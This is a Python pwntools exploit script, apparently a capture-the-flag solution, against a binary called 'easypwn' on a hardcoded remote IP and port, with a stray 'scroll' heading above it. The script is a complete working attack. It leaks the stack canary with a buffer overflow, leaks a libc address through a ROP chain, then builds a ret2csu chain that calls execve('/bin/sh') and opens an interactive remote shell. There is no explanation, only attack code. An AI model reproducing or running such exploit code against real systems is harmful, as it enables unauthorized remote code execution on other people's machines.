# scroll
滚动条

#/usr/env/bin python

from pwn import *

context.binary = './easypwn'
context.terminal = ['tmux','sp','-h']
#context.log_level = 'debug'
elf = ELF('./easypwn')

#io = process('./easypwn')
io = remote('106.75.66.195', 20000)

#leak Canary
io.recvuntil('Who are you?\n')
io.sendline('A'*(0x50-0x8))
io.recvuntil('A'*(0x50-0x8))

canary = u64(io.recv(8))-0xa
log.info('canary:'+hex(canary))

#leak read_addr
io.recvuntil('tell me your real name?\n')
payload = 'A'*(0x50-0x8)
payload += p64(canary)
payload += 'A'*0x8
payload += p64(0x4007f3)
payload += p64(elf.got['read'])
payload += p64(elf.plt['puts'])
payload += p64(0x4006C6)
io.send(payload)
io.recvuntil('See you again!\n')

#cacl syscall_addr
read_addr = u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))
log.info('read_addr:'+hex(read_addr))
syscall = read_addr+0xe
log.info('syscall:'+hex(syscall))

sleep(0.5)

io.recvuntil('Who are you?\n')
io.sendline('A'*(0x50-0x8))

#gdb.attach(io,'b *0x4007d6')
#execve("/bin/sh",NULL,NULL)
io.recvuntil('tell me your real name?\n')
payload = 'A'*(0x50-0x8)
payload += p64(canary)
payload += 'A'*0x8
payload += p64(0x4007EA)
payload += p64(0)+p64(1)+p64(elf.got['read'])+p64(0x3B)+p64(0x601080)+p64(0)
payload += p64(0x4007D0)
payload += p64(0)
payload += p64(0)+p64(1)+p64(0x601088)+p64(0)+p64(0)+p64(0x601080)
payload += p64(0x4007D0)
io.send(payload)
sleep(0.5)

raw_input('Go?')
content = '/bin/sh\x00'+p64(syscall)
content = content.ljust(0x3B,'A')
io.send(content)

io.interactive()
